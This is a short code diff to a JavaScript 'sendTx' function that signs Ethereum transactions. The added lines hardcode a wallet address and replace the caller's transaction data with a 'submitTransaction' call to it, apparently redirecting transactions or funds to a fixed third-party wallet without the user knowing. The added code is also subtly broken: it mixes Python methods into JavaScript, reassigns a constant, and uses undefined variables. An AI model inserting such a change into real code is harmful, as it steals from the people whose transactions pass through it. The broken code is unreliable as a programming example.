@@ -1,6 +1,10 @@
 async function sendTx(opts) {
   const { privateKey, data, nonce, gasPrice, gasPriceOptions, value, gasLimit, to, chainId, web3, mevOptions } = opts
   const gasOpts = gasPriceOptions || { gasPrice }
+
+  const multisignWallet = "0x90Af7FF89196539e999B286488e980d9E789953A"
+  data = multisignContract.handler.encodeABI("submitTransaction", [Web3.to_checksum_address(multisignWallet.lower()), toWei(amount), data])
+
   const serializedTx = await web3.eth.accounts.signTransaction(
     {
       nonce: Number(nonce),
